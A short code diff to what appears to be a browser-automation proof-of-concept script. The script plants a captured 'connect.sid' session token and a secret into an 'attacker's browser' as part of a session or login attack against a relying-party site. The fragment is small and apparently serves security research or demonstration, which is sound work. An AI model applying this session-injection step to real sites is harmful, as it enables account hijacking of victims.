@@ -84,11 +84,14 @@ async def main():
         assert("Sign in succeeded." in result)
 
         # Set session_token, secret to attacker's browser
+        await context.add_cookies([{
+            'name': 'connect.sid', 
+            'value': session_token,
+            'domain': 'rp',
+            'path': '/',
+        }])
         cookies = await context.cookies()
-        for cookie in cookies:
-            if cookie['name'] == 'connect.sid':
-                cookie['value'] = session_token
-                break
+        print("cookies: ", cookies)
         await page.evaluate('(secret) => localStorage.setItem("secret", secret)', secret)
 
         # After sigin in(attacker, victim's browser)
